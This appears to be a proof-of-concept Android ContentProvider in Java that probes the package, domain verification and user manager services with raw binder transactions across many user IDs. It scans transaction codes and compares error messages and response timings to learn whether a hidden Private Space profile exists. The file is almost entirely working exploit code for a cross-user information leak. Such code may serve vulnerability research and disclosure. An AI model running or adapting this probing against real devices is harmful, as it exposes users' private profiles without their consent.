package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Parcel;
import android.os.SystemClock;
import java.lang.reflect.Method;

public class TimingOracleProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        // STRATEGY: Test if error messages or response types differ between:
        // - Valid user IDs (0, 11)
        // - Invalid user IDs (99, 100)
        // If the system gives different errors for "valid user but no permission"
        // vs "invalid user", we can detect Private Space existence

        IBinder pmBinder = getServiceBinder("package");
        if (pmBinder == null) { cursor.addRow(new Object[]{"error", "no PM binder"}); return cursor; }
        String pmDesc = "android.content.pm.IPackageManager";

        // Test getInstalledPackages for various userId values
        // Record: error type, error message, response time
        cursor.addRow(new Object[]{"=== PM getInstalledPackages error oracle ===", ""});
        int[] userIds = {0, 10, 11, 12, 13, 15, 99, 100, 200, -1};
        for (int userId : userIds) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            long start = SystemClock.elapsedRealtimeNanos();
            try {
                data.writeInterfaceToken(pmDesc);
                data.writeInt(0); // flags
                data.writeInt(userId);
                pmBinder.transact(8, data, reply, 0);
                reply.readException();
                long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                int avail = reply.dataAvail();
                cursor.addRow(new Object[]{"pm_u" + userId,
                    "OK avail=" + avail + " time=" + (elapsed / 1000) + "us"});
            } catch (SecurityException e) {
                long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                cursor.addRow(new Object[]{"pm_u" + userId,
                    "SEC:" + truncate(e.getMessage()) + " time=" + (elapsed / 1000) + "us"});
            } catch (Exception e) {
                long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                cursor.addRow(new Object[]{"pm_u" + userId,
                    "ERR:" + truncate(e.getMessage()) + " time=" + (elapsed / 1000) + "us"});
            }
            data.recycle();
            reply.recycle();
        }

        // Test DomainVerification with timing
        IBinder dvBinder = getServiceBinder("domain_verification");
        if (dvBinder != null) {
            String dvDesc = "android.content.pm.verify.domain.IDomainVerificationManager";
            cursor.addRow(new Object[]{"=== DV error oracle ===", ""});
            for (int userId : userIds) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                long start = SystemClock.elapsedRealtimeNanos();
                try {
                    data.writeInterfaceToken(dvDesc);
                    data.writeString("com.android.chrome");
                    data.writeInt(userId);
                    dvBinder.transact(3, data, reply, 0);
                    reply.readException();
                    long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                    int avail = reply.dataAvail();
                    cursor.addRow(new Object[]{"dv_u" + userId,
                        "OK avail=" + avail + " time=" + (elapsed / 1000) + "us"});
                } catch (SecurityException e) {
                    long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                    String msg = e.getMessage();
                    // Key: does the error say "edit other users" (valid user)
                    // vs "does not exist" (invalid user)?
                    String shortMsg = msg != null && msg.length() > 60 ? msg.substring(0, 60) : msg;
                    cursor.addRow(new Object[]{"dv_u" + userId,
                        "SEC[" + shortMsg + "] t=" + (elapsed / 1000) + "us"});
                } catch (Exception e) {
                    long elapsed = SystemClock.elapsedRealtimeNanos() - start;
                    cursor.addRow(new Object[]{"dv_u" + userId,
                        "ERR:" + truncate(e.getMessage()) + " t=" + (elapsed / 1000) + "us"});
                }
                data.recycle();
                reply.recycle();
            }
        }

        // Test UserManager.isUserUnlocked(userId) — might reveal user existence
        IBinder umBinder = getServiceBinder("user");
        if (umBinder != null) {
            String umDesc = "android.os.IUserManager";
            cursor.addRow(new Object[]{"=== UserManager oracle ===", ""});

            // Try various TX codes for IUserManager
            // getUserInfo, isUserUnlocked, getUserProfiles, isProfileAccessible, etc.
            // TX scan with userId parameter
            for (int tx = 1; tx <= 30; tx++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(umDesc);
                    data.writeInt(11); // userId = Private Space
                    umBinder.transact(tx, data, reply, 0);
                    reply.readException();
                    int avail = reply.dataAvail();
                    if (avail > 0) {
                        int pos = reply.dataPosition();
                        int first = reply.readInt();
                        cursor.addRow(new Object[]{"um_tx" + tx + "_u11",
                            "OK avail=" + avail + " first=" + first});
                    }
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"um_tx" + tx + "_u11",
                        "SEC:" + truncate(e.getMessage())});
                } catch (Exception e) {
                    String msg = e.getMessage();
                    if (msg != null && msg.length() > 5 && !msg.contains("consumed")) {
                        cursor.addRow(new Object[]{"um_tx" + tx + "_u11",
                            "ERR:" + truncate(msg)});
                    }
                }
                data.recycle();
                reply.recycle();
            }

            // getUserSerialNumber(userId) — if this works without permission
            // it reveals which user IDs are valid
            cursor.addRow(new Object[]{"=== getUserSerialNumber ===", ""});
            for (int userId : userIds) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(umDesc);
                    data.writeInt(userId);
                    // Try several TX codes that might be getUserSerialNumber
                    umBinder.transact(14, data, reply, 0);
                    reply.readException();
                    int avail = reply.dataAvail();
                    if (avail >= 4) {
                        int serial = reply.readInt();
                        cursor.addRow(new Object[]{"serial_u" + userId,
                            "serial=" + serial + (serial >= 0 ? " VALID_USER!" : " invalid")});
                    }
                } catch (SecurityException e) {
                    cursor.addRow(new Object[]{"serial_u" + userId, "DENIED"});
                } catch (Exception e) {
                    cursor.addRow(new Object[]{"serial_u" + userId, "ERR:" + truncate(e.getMessage())});
                }
                data.recycle();
                reply.recycle();
            }
        }

        return cursor;
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
